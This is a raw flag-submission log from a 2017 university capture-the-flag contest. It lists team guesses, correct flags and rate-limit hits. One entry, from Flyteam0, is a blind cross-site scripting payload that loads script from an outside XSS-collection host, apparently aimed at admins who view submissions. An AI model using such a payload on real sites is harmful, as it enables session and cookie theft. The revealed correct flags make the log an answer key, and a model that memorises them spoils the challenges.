[05/06/2017 22:18:01] 不晓得取啥队伍名 submitted flag{basekey_is_here} with kpm 3 [WRONG]
[05/06/2017 22:18:08] 不晓得取啥队伍名 submitted flag{@basekey_is_here} with kpm 4 [WRONG]
[05/06/2017 22:18:56] 死亡地平线 submitted flag with kpm 0 [WRONG]
[05/06/2017 22:19:05] Flyteam2 submitted  with kpm 0 [WRONG]
[05/06/2017 22:19:05] 死亡地平线 submitted flag{hex} with kpm 1 [WRONG]
[05/06/2017 22:19:20] 死亡地平线 submitted flag{1234567890} with kpm 2 [WRONG]
[05/06/2017 22:20:30] Flyteam3 submitted flag{This_12_sign} with kpm 0 [WRONG]
[05/06/2017 22:24:09] 西石油一队 submitted flag{hello} with kpm 0 [WRONG]
[05/06/2017 22:25:13] 董天董地董蛤 submitted flag{0f77057549fa06647abd8a0b4089fa8a} with kpm 0 [CORRECT]
[05/06/2017 22:25:21] Flyteam1 submitted flag{mortal} with kpm 0 [WRONG]
[05/06/2017 22:25:21] 死亡地平线 submitted flag{welcome_come_wtf} with kpm 0 [WRONG]
[05/06/2017 22:25:46] 董天董地董蛤 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 22:26:06] 西石油二队 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:26:14] 董天董地董蛤 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 1 [WRONG]
[05/06/2017 22:27:27] 三脸懵逼 submitted flag{{c8a924de694da4a44c897aa19a9dd94d}} with kpm 0 [WRONG]
[05/06/2017 22:27:34] 三脸懵逼 submitted flag{c8a924de694da4a44c897aa19a9dd94d} with kpm 1 [WRONG]
[05/06/2017 22:27:44] 三脸懵逼 submitted flag{c8a924de694da4a44c897aa19a9dd94d} with kpm 2 [WRONG]
[05/06/2017 22:28:40] 死亡地平线 submitted flag(63EDB370FF55D3C3) with kpm 0 [WRONG]
[05/06/2017 22:28:53] 董天董地董蛤 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 22:29:00] 死亡地平线 submitted flag(3212F5F463EDB370FF55D3C3A7A15C8F) with kpm 1 [WRONG]
[05/06/2017 22:29:25] 董天董地董蛤 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 1 [WRONG]
[05/06/2017 22:29:40] Flyteam0 submitted  with kpm 0 [WRONG]
[05/06/2017 22:31:03] 三脸懵逼 submitted flag{c8b924dd694db4e44c897bb19b9dd94d} with kpm 0 [WRONG]
[05/06/2017 22:32:46] 西石油二队 submitted flag{sqli_&_url_include_on} with kpm 0 [CORRECT]
[05/06/2017 22:34:32] 不晓得取啥队伍名 submitted flag{i_love_rsa} with kpm 0 [WRONG]
[05/06/2017 22:34:45] test submitted flag{sicnuisasher} with kpm 0 [WRONG]
[05/06/2017 22:35:04] test submitted flag{welcome_T0_sICnuISA} with kpm 1 [CORRECT]
[05/06/2017 22:35:06] test submitted flag{False} with kpm 1 [WRONG]
[05/06/2017 22:35:09] 笑傲江湖 submitted  with kpm 0 [WRONG]
[05/06/2017 22:35:09] test submitted flag{sicnuisasher} with kpm 2 [WRONG]
[05/06/2017 22:35:37] test submitted flag{Sherc_Fuck_Android} with kpm 3 [CORRECT]
[05/06/2017 22:36:04] test submitted flahflag{1tsvErYe0Sy!} with kpm 2 [WRONG]
[05/06/2017 22:36:11] test submitted flag{1tsvErYe0Sy!} with kpm 1 [CORRECT]
[05/06/2017 22:36:26] Flyteam0 submitted flag{_file.c} with kpm 0 [WRONG]
[05/06/2017 22:36:27] ThreeNB submitted flag{bacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
[05/06/2017 22:36:46] zzz submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 22:37:48] 死亡地平线 submitted flag{welcome_come_ctf} with kpm 0 [WRONG]
[05/06/2017 22:38:15] ThreeNB submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
[05/06/2017 22:39:11] 不晓得取啥队伍名 submitted flag{tree_tree_tree} with kpm 0 [WRONG]
[05/06/2017 22:39:21] 三脸懵逼 submitted flag{pvb_rh_sviv} with kpm 0 [WRONG]
[05/06/2017 22:39:48] 6602 submitted flag{hmcidcepogoepfgcofzgsppog} with kpm 0 [WRONG]
[05/06/2017 22:40:05] 西石油一队 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
05/06/2017 22:42:40 submitted test with kpm flag{0123456789abcdefABCDEF} [ALREADY SOLVED]
[05/06/2017 22:43:26] 6602 submitted flag{glbhcbdonfndoefbneyfroonf} with kpm 0 [WRONG]
[05/06/2017 22:43:44] 6602 submitted flag{indjedfqphpfqghdpgahtqqph} with kpm 1 [WRONG]
[05/06/2017 22:44:17] 6602 submitted flag{joekfegrqiqgrhieqhbiurrqi} with kpm 2 [WRONG]
[05/06/2017 22:44:36] 6602 submitted flag{kpflgfhsrjrhsijfricjvssrj} with kpm 2 [WRONG]
[05/06/2017 22:44:41] Flyteam3 submitted flag{ThIs _12_sign} with kpm 0 [WRONG]
[05/06/2017 22:44:49] Flyteam3 submitted flag{This _12_sign} with kpm 1 [WRONG]
[05/06/2017 22:44:49] 6602 submitted flag{lqgmhgitsksitjkgsjdkwttsk} with kpm 2 [WRONG]
[05/06/2017 22:44:55] Flyteam3 submitted flag{This _12_sign} with kpm 2 [WRONG]
[05/06/2017 22:45:03] 6602 submitted flag{mrhnihjutltjuklhtkelxuutl} with kpm 3 [WRONG]
[05/06/2017 22:45:17] 6602 submitted flag{nsiojikvumukvlmiulfmyvvum} with kpm 4 [WRONG]
[05/06/2017 22:45:22] Flyteam3 submitted flag{This _17_sign} with kpm 3 [WRONG]
[05/06/2017 22:45:27] Flyteam3 submitted flag{Thls _17_sign} with kpm 4 [WRONG]
[05/06/2017 22:45:31] 6602 submitted flag{otjpkjlwvnvlwmnjvmgnzwwvn} with kpm 4 [WRONG]
[05/06/2017 22:45:47] 6602 submitted flag{pukqlkmxwowmxnokwnhoaxxwo} with kpm 4 [WRONG]
[05/06/2017 22:46:00] 6602 submitted flag{qvlrmlnyxpxnyoplxoipbyyxp} with kpm 4 [WRONG]
[05/06/2017 22:46:11] Flyteam4 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:46:15] 6602 submitted flag{rwmsnmozyqyozpqmypjqczzyq} with kpm 4 [WRONG]
[05/06/2017 22:46:29] 6602 submitted flag{sxntonpazrzpaqrnzqkrdaazr} with kpm 4 [WRONG]
[05/06/2017 22:46:37] Flyteam2 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:46:43] 6602 submitted flag{tyoupoqbasaqbrsoarlsebbas} with kpm 4 [WRONG]
[05/06/2017 22:46:52] Flyteam3 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:46:56] 6602 submitted flag{uzpvqprcbtbrcstpbsmtfccbt} with kpm 4 [WRONG]
[05/06/2017 22:47:09] 6602 submitted flag{vaqwrqsdcucsdtuqctnugddcu} with kpm 4 [WRONG]
05/06/2017 22:47:15 submitted test with kpm flag{213} [ALREADY SOLVED]
[05/06/2017 22:47:22] 6602 submitted flag{wbrxsrtedvdteuvrduovheedv} with kpm 4 [WRONG]
[05/06/2017 22:47:38] 6602 submitted flag{xcsytsufeweufvwsevpwiffew} with kpm 4 [WRONG]
[05/06/2017 22:47:50] 6602 submitted flag{ydtzutvgfxfvgwxtfwqxjggfx} with kpm 4 [WRONG]
[05/06/2017 22:48:04] 6602 submitted flag{zeuavuwhgygwhxyugxrykhhgy} with kpm 4 [WRONG]
[05/06/2017 22:48:19] 6602 submitted flag{afvbwvxihzhxiyzvhyszliihz} with kpm 4 [WRONG]
[05/06/2017 22:48:29] 6602 submitted flag{bgwcxwyjiaiyjzawiztamjjia} with kpm 4 [WRONG]
[05/06/2017 22:48:38] 6602 submitted flag{chxdyxzkjbjzkabxjaubnkkjb} with kpm 4 [WRONG]
[05/06/2017 22:48:46] 6602 submitted flag{diyezyalkckalbcykbvcollkc} with kpm 5 [WRONG]
[05/06/2017 22:48:55] 6602 submitted flag{ejzfazbmldlbmcdzlcwdpmmld} with kpm 5 [WRONG]
[05/06/2017 22:49:04] 6602 submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 5 [WRONG]
05/06/2017 22:49:16 submitted test with kpm flag [ALREADY SOLVED]
[05/06/2017 22:49:31] test submitted flag{123} with kpm 0 [WRONG]
[05/06/2017 22:50:25] Flyteam0 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:52:28] Flyteam1 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 22:53:21] 三脸懵逼 submitted flag{c89924d2694d94f44c897991999dd94d} with kpm 0 [WRONG]
[05/06/2017 22:53:28] 三脸懵逼 submitted flag{c88924d1694d84f44c897881989dd94d} with kpm 1 [WRONG]
[05/06/2017 22:53:38] 三脸懵逼 submitted flag{c87924d0694d74f44c897771979dd94d} with kpm 2 [WRONG]
[05/06/2017 22:54:38] Flyteam1 submitted flag{mortal} with kpm 0 [WRONG]
[05/06/2017 22:54:54] 6602 submitted flag{glbhcbdonfndoefbneyfroonf} with kpm 0 [WRONG]
[05/06/2017 22:54:54] Flyteam1 submitted flag{fuck u bich} with kpm 1 [WRONG]
[05/06/2017 22:55:03] test submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 22:55:21] 6602 submitted flag{hmcidcepogoepfgcofzgsppog} with kpm 1 [WRONG]
[05/06/2017 22:55:22] 董天董地董蛤 submitted flag{sqli_&_url_include_on}  with kpm 0 [CORRECT]
[05/06/2017 22:55:42] 6602 submitted flag{indjedfqphpfqghdpgahtqqph} with kpm 2 [WRONG]
[05/06/2017 23:01:20] 冰血封情 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 23:02:37] 笑傲江湖 submitted flag{3test} with kpm 0 [WRONG]
[05/06/2017 23:03:14] test submitted flag{its so easy} with kpm 0 [WRONG]
[05/06/2017 23:03:34] Flyteam5 submitted flag{un5eria1ize_and_w3ak_c1ass} with kpm 0 [CORRECT]
[05/06/2017 23:03:34] 6602 submitted flag{glbhcbdonfndoefbneyfroonf} with kpm 0 [WRONG]
[05/06/2017 23:03:36] 笑傲江湖 submitted flag{test} with kpm 1 [WRONG]
[05/06/2017 23:03:48] 6602 submitted flag{hmcidcepogoepfgcofzgsppog} with kpm 1 [WRONG]
[05/06/2017 23:04:00] 6602 submitted flag{hmcidcepogoepfgcofzgsppog} with kpm 2 [WRONG]
[05/06/2017 23:04:55] ThreeNB submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:05:03] 6602 submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
[05/06/2017 23:05:29] 6602 submitted flag{vzsttstipsst} with kpm 1 [WRONG]
[05/06/2017 23:05:30] 笑傲江湖 submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 23:05:48] 抽象二队 submitted flag{uztgvkuwvjvkvgszsusvgszvfuvksvfmvunkszszsu} with kpm 0 [WRONG]
[05/06/2017 23:06:00] 抽象二队 submitted flag{lgmzkvljkwkvkzngnflfnfkzngklfkvnfktklfsvngngnflf} with kpm 1 [WRONG]
[05/06/2017 23:07:20] 不晓得取啥队伍名 submitted flag{bacon} with kpm 0 [WRONG]
[05/06/2017 23:07:24] 不晓得取啥队伍名 submitted flag{Bacon} with kpm 1 [WRONG]
[05/06/2017 23:07:45] ThreeNB submitted flag{iloveu} with kpm 0 [WRONG]
[05/06/2017 23:07:51] ThreeNB submitted flag{ilovectf} with kpm 1 [WRONG]
[05/06/2017 23:08:00] ThreeNB submitted flag{ilove_ctf} with kpm 2 [WRONG]
[05/06/2017 23:08:11] ThreeNB submitted flag{ilove_sicnuctf} with kpm 3 [WRONG]
[05/06/2017 23:08:14] ThreeNB submitted flag{ilove_sicnu} with kpm 4 [WRONG]
[05/06/2017 23:10:22] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 23:11:48] ThreeNB submitted flag{c0w_1s_ntfs_c0w} with kpm 0 [CORRECT]
[05/06/2017 23:12:06] 笑傲江湖 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:12:21] 三脸懵逼 submitted flag{c8a924dA694da4F44c897aa19a9dd94d} with kpm 0 [WRONG]
[05/06/2017 23:12:26] 三脸懵逼 submitted flag{c8a924dB694da4F44c897aa19a9dd94d} with kpm 1 [WRONG]
[05/06/2017 23:12:30] 三脸懵逼 submitted flag{c8a924dC694da4F44c897aa19a9dd94d} with kpm 2 [WRONG]
[05/06/2017 23:12:32] 6602 submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
[05/06/2017 23:12:33] 三脸懵逼 submitted flag{c8a924dD694da4F44c897aa19a9dd94d} with kpm 3 [WRONG]
[05/06/2017 23:12:37] 三脸懵逼 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 4 [CORRECT]
[05/06/2017 23:13:40] Flyteam0 submitted <script src=http://webxss.net/GgrCAW?1494124378></script>  with kpm 0 [WRONG]
[05/06/2017 23:13:58] ThreeNB submitted flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 0 [CORRECT]
[05/06/2017 23:14:56] 抽象二队 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:14:59] 三脸懵逼 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:15:17] Flyteam3 submitted flag with kpm 0 [WRONG]
[05/06/2017 23:15:29] Flyteam3 submitted flag{LOCK XADD DWORD PTR DS:[EAX],ECX} with kpm 1 [WRONG]
[05/06/2017 23:15:52] 6602 submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
05/06/2017 23:16:03 submitted 抽象二队 with kpm flag{lgmzkvljkwkvkzngnflfnfkzngklfkvnfktklfsvngngnflf} [ALREADY SOLVED]
[05/06/2017 23:16:18] 笑傲江湖 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/06/2017 23:16:20] 6602 submitted flag{vzsttstipsst} with kpm 1 [WRONG]
[05/06/2017 23:16:49] ThreeNB submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/06/2017 23:18:40] Flyteam4 submitted flag{baconencodcagagedmma} with kpm 0 [WRONG]
[05/06/2017 23:19:29] 笑傲江湖 submitted flag{go} with kpm 0 [WRONG]
[05/06/2017 23:19:32] 笑傲江湖 submitted flag{goon} with kpm 1 [WRONG]
[05/06/2017 23:19:32] 笑傲江湖 submitted flag{goon} with kpm 2 [WRONG]
[05/06/2017 23:19:37] 笑傲江湖 submitted flag{go on} with kpm 3 [WRONG]
[05/06/2017 23:23:11] Flyteam2 submitted flag{Th1s_12_sign} with kpm 0 [WRONG]
[05/06/2017 23:23:18] Flyteam2 submitted flag{Th1s_12_sign} with kpm 1 [CORRECT]
[05/06/2017 23:24:05] 6602 submitted flag{fkagbacnmemcndeamdxeqnnme} with kpm 0 [WRONG]
[05/06/2017 23:24:28] 抽象二队 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [WRONG]
[05/06/2017 23:28:00] Flyteam4 submitted flag{bacoecodca} with kpm 0 [WRONG]
[05/06/2017 23:29:28] Flyteam4 submitted flag{bacoecodcaga} with kpm 0 [WRONG]
[05/06/2017 23:29:34] 笑傲江湖 submitted flag{1e7ccd7540297023f99be5140048cf9fb2d75a01} with kpm 0 [WRONG]
[05/06/2017 23:29:36] 三脸懵逼 submitted pvb_rh_sviv with kpm 0 [WRONG]
[05/06/2017 23:29:44] 三脸懵逼 submitted flag{pvb_rh_sviv} with kpm 1 [WRONG]
[05/06/2017 23:29:53] Flyteam0 submitted flag{65537} with kpm 0 [WRONG]
[05/06/2017 23:30:16] 死亡地平线 submitted flag{ with kpm 0 [WRONG]
[05/06/2017 23:30:23] Flyteam0 submitted flag{de8df8dc7d5ce734} with kpm 1 [WRONG]
[05/06/2017 23:30:30] 笑傲江湖 submitted flag{521ed315f9aff86b} with kpm 1 [WRONG]
[05/06/2017 23:30:37] Flyteam0 submitted flag{de8df8dc7d5ce734} with kpm 2 [WRONG]
[05/06/2017 23:31:11] 死亡地平线 submitted flag{welcome_TO_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 23:31:11] 6602 submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/06/2017 23:31:28] ThreeNB submitted falg{bus} with kpm 0 [WRONG]
[05/06/2017 23:31:30] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 23:32:26] 死亡地平线 submitted flag{c8a924dE694da4F44c897aa19a9dd94d}  with kpm 1 [WRONG]
[05/06/2017 23:32:30] 死亡地平线 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 1 [WRONG]
[05/06/2017 23:32:30] Flyteam0 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 23:32:34] Flyteam0 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 23:32:45] 死亡地平线 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 2 [CORRECT]
[05/06/2017 23:33:07] 西石油一队 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:33:13] 笑傲江湖 submitted flag{521ed315f9aff86b} with kpm 0 [WRONG]
[05/06/2017 23:33:42] 笑傲江湖 submitted  with kpm 1 [WRONG]
[05/06/2017 23:33:58] 西石油三队 submitted  with kpm 0 [WRONG]
[05/06/2017 23:34:00] 死亡地平线 submitted flagf{welcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 23:34:08] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 23:34:36] ThreeNB submitted flag{ba_shi} with kpm 0 [WRONG]
[05/06/2017 23:35:07] Flyteam0 submitted ZmxhZ3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/06/2017 23:35:11] 董天董地董蛤 submitted  flag{round_or_cut_is_dangerous}  with kpm 0 [CORRECT]
[05/06/2017 23:35:12] WHT submitted {wlaxraconunsoduantzuqoone} with kpm 0 [WRONG]
[05/06/2017 23:35:17] WHT submitted flag{wlaxraconunsoduantzuqoone} with kpm 1 [WRONG]
[05/06/2017 23:35:36] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 23:35:55] WHT submitted flag{wlaxraconvnsoduantzuqoone} with kpm 2 [WRONG]
[05/06/2017 23:35:59] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 23:36:01] WHT submitted flag{wlaxraconvnsodvantzuqoone} with kpm 3 [WRONG]
[05/06/2017 23:36:07] WHT submitted flag{wlaxraconvnsodvantzvqoone} with kpm 4 [WRONG]
[05/06/2017 23:36:28] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 2 [WRONG]
[05/06/2017 23:37:04] 抽象二队 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/06/2017 23:37:11] 西石油一队 submitted flag{round_or_cut_is_dangerous} with kpm 0 [CORRECT]
[05/06/2017 23:37:12] 抽象二队 submitted  with kpm 0 [WRONG]
05/06/2017 23:37:22 submitted test with kpm flag{} [ALREADY SOLVED]
[05/06/2017 23:37:37] zzz submitted flag{Sherc_Fuck_Android} with kpm 0 [CORRECT]
[05/06/2017 23:38:17] 董天董地董蛤 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 23:38:17] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 23:38:33] 6602 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
05/06/2017 23:38:56 submitted test with kpm  [ALREADY SOLVED]
05/06/2017 23:39:02 submitted test with kpm flag{} [ALREADY SOLVED]
[05/06/2017 23:40:04] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 0 [WRONG]
[05/06/2017 23:40:15] WHT submitted flag{wlaxraconunsoduantzvqoone} with kpm 0 [WRONG]
[05/06/2017 23:40:23] 死亡地平线 submitted flag{welcome_TO_sICnuISA} with kpm 1 [WRONG]
[05/06/2017 23:40:23] 死亡地平线 submitted flag{welcome_TO_sICnuISA} with kpm 2 [WRONG]
[05/06/2017 23:40:27] 死亡地平线 submitted flag{welcome_To_sICnuISA} with kpm 3 [WRONG]
[05/06/2017 23:40:33] WHT submitted flag{wlaxraconunsodvantzuqoone} with kpm 1 [WRONG]
[05/06/2017 23:40:46] WHT submitted flag{wlaxraconunsodvantzvqoone} with kpm 2 [WRONG]
[05/06/2017 23:41:00] WHT submitted flag{wlaxraconunsodvantzvqoone} with kpm 3 [WRONG]
[05/06/2017 23:41:10] WHT submitted flag{wlaxraconvnsoduantzuqoone} with kpm 4 [WRONG]
[05/06/2017 23:41:19] 不晓得取啥队伍名 submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/06/2017 23:41:31] WHT submitted flag{wlaxraconvnsoduantzvqoone} with kpm 4 [WRONG]
[05/06/2017 23:41:59] WHT submitted flag{wlaxraconvnsodvantzuqoone} with kpm 3 [WRONG]
[05/06/2017 23:41:59] 西石油三队 submitted flag{sqli_&_url_include_on} with kpm 0 [CORRECT]
[05/06/2017 23:43:06] WHT submitted flag{c8a924dE694da4F44c897aa19a9dd94d} with kpm 0 [CORRECT]
[05/06/2017 23:43:35] ThreeNB submitted flag{key_is_here} with kpm 0 [WRONG]
[05/06/2017 23:43:39] Flyteam4 submitted flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/06/2017 23:43:58] WHT submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/06/2017 23:45:20] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGKFLFKVNFKFTKLFSVNGNGNFLF} with kpm 0 [WRONG]
[05/06/2017 23:46:27] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGKZLFKVNFKZTKLFSVNGNGNFLF} with kpm 0 [WRONG]
[05/06/2017 23:46:28] Flyteam3 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/06/2017 23:46:48] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGKYLFKVNFKYTKLFSVNGNGNFLF} with kpm 1 [WRONG]
[05/06/2017 23:49:51] WHT submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 23:50:00] 不晓得取啥队伍名 submitted flag{lgmzkvljkwkvkgngnflfnfkzngkflfkvnfkltklfsvngngnflf} with kpm 0 [WRONG]
[05/06/2017 23:50:09] 不晓得取啥队伍名 submitted flaglgmzkvljkwkvkgngnflfnfkzngkflfkvnfkltklfsvngngnflf with kpm 1 [WRONG]
[05/06/2017 23:50:21] 不晓得取啥队伍名 submitted flagLGMZKVLJKWKVKGNGNFLFNFKZNGKFLFKVNFKLTKLFSVNGNGNFLF with kpm 2 [WRONG]
[05/06/2017 23:50:33] Flyteam4 submitted flag(bacongncodeandzeroone) with kpm 0 [WRONG]
[05/06/2017 23:52:12] Flyteam0 submitted flag{missing locale facet} with kpm 0 [WRONG]
[05/06/2017 23:52:19] Flyteam4 submitted Flag{bacongncodeandzeroone} with kpm 0 [WRONG]
[05/06/2017 23:53:30] 董天董地董蛤 submitted flag{79eefb979f31b523cd3c51df77701d89} with kpm 0 [CORRECT]
[05/06/2017 23:53:31] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 0 [WRONG]
[05/06/2017 23:53:51] Flyteam5 submitted flag{222122232211010011100333030011111211011211122332330332223221110011112233} with kpm 1 [WRONG]
[05/06/2017 23:54:09] 冰血封情 submitted flag{LGMZKVLJKWKVKZNGNFLFNFKZNGKYLFKVNFKYTKLFSVNGNGNFLF} with kpm 0 [WRONG]
[05/06/2017 23:54:20] Flyteam0 submitted flag{dece1b19c8cacf6e} with kpm 0 [WRONG]
[05/06/2017 23:55:02] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/06/2017 23:55:28] Flyteam0 submitted flag{10a647d0b92f5967} with kpm 0 [WRONG]
[05/06/2017 23:55:32] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/06/2017 23:56:13] Flyteam0 submitted flag{hahaha} with kpm 1 [WRONG]
[05/06/2017 23:56:42] Flyteam0 submitted flag{hahaha} with kpm 1 [WRONG]
[05/06/2017 23:57:20] Flyteam0 submitted flag{missing locale facet} with kpm 1 [WRONG]
[05/06/2017 23:57:25] 冰血封情 submitted  with kpm 0 [WRONG]
[05/06/2017 23:57:25] Flyteam0 submitted flag{missinglocalefacet} with kpm 2 [WRONG]
[05/06/2017 23:57:51] Flyteam0 submitted flag{820459ff45fbd6f6} with kpm 2 [WRONG]
[05/06/2017 23:58:38] 西石油二队 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/06/2017 23:58:56] 西石油二队 submitted flag{hello} with kpm 1 [WRONG]
[05/06/2017 23:59:13] 死亡地平线 submitted flag{welcome_T0_sICnuISA} with kpm 0 [CORRECT]
[05/06/2017 23:59:43] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 0 [WRONG]
[05/07/2017 00:00:54] Flyteam0 submitted Z3tUaDFzXzEyX3NpZ259 with kpm 0 [WRONG]
[05/07/2017 00:01:06] Flyteam0 submitted flag{Z3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/07/2017 00:02:01] 西石油二队 submitted flag{5d41402abc4b2a76b9719d911017c592} with kpm 0 [WRONG]
[05/07/2017 00:04:26] Flyteam0 submitted flag{5A3374556144467A587A457958334E705A323539} with kpm 0 [WRONG]
[05/07/2017 00:05:21] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 0 [WRONG]
[05/07/2017 00:05:36] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 1 [WRONG]
05/07/2017 00:06:16 submitted Flyteam0 with kpm  [ALREADY SOLVED]
[05/07/2017 00:07:56] Flyteam0 submitted flag{Th1s_12_sign} with kpm 0 [CORRECT]
[05/07/2017 00:11:46] Flyteam2 submitted 2test with kpm 0 [WRONG]
[05/07/2017 00:12:23] Flyteam2 submitted flag{2test} with kpm 1 [WRONG]
[05/07/2017 00:12:33] Flyteam2 submitted flag{"2test"} with kpm 2 [WRONG]
[05/07/2017 00:12:45] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 0 [WRONG]
[05/07/2017 00:12:56] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 1 [WRONG]
[05/07/2017 00:13:40] Flyteam2 submitted flag{"3test"} with kpm 0 [WRONG]
[05/07/2017 00:13:40] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 2 [WRONG]
[05/07/2017 00:13:51] Flyteam5 submitted 222122232211010011100333030011111211011211122332330332223221110011112233 with kpm 2 [WRONG]
05/07/2017 00:14:11 submitted Flyteam0 with kpm flag{Th1s_12_sign} [ALREADY SOLVED]
[05/07/2017 00:14:16] Flyteam2 submitted flag{3test} with kpm 1 [WRONG]
[05/07/2017 00:14:33] Flyteam5 submitted  with kpm 2 [WRONG]
[05/07/2017 00:14:37] Flyteam2 submitted  flag{ca820ad57809f62eb7b4d13f5d4371a0} with kpm 2 [CORRECT]
[05/07/2017 00:15:08] 死亡地平线 submitted flag with kpm 0 [WRONG]
[05/07/2017 00:15:11] 死亡地平线 submitted flag{ZmxhZ3tUaDFzXzEyX3NpZ259} with kpm 1 [WRONG]
[05/07/2017 00:17:11] 冰血封情 submitted  with kpm 0 [WRONG]
[05/07/2017 00:19:27] 三脸懵逼 submitted flag{1tsvErYe0Sy!} with kpm 0 [CORRECT]
[05/07/2017 00:19:36] 死亡地平线 submitted flag{baconencodeandzeroone} with kpm 0 [CORRECT]
[05/07/2017 00:23:32] Flyteam0 submitted flag{65537} with kpm 0 [WRONG]
[05/07/2017 00:23:34] Flyteam0 submitted flag{65538} with kpm 1 [WRONG]
[05/07/2017 00:23:36] Flyteam0 submitted flag{65538} with kpm 2 [WRONG]
[05/07/2017 00:23:36] Flyteam0 submitted flag{65538} with kpm 3 [WRONG]
[05/07/2017 00:23:38] Flyteam0 submitted flag{65539} with kpm 4 [WRONG]
[05/07/2017 00:23:38] Flyteam0 submitted flag{65539} with kpm 5 [WRONG]
[05/07/2017 00:23:39] Flyteam0 submitted flag{65539} with kpm 6 [WRONG]
[05/07/2017 00:23:39] Flyteam0 submitted flag{65539} with kpm 7 [WRONG]
[05/07/2017 00:23:39] Flyteam0 submitted flag{65539} with kpm 8 [WRONG]
[05/07/2017 00:23:39] Flyteam0 submitted flag{65539} with kpm 9 [WRONG]
[05/07/2017 00:23:39] Flyteam0 submitted flag{65539} with kpm 10 [WRONG]
[05/07/2017 00:23:40] Flyteam0 submitted flag{65539} with kpm 11 [TOO FAST]
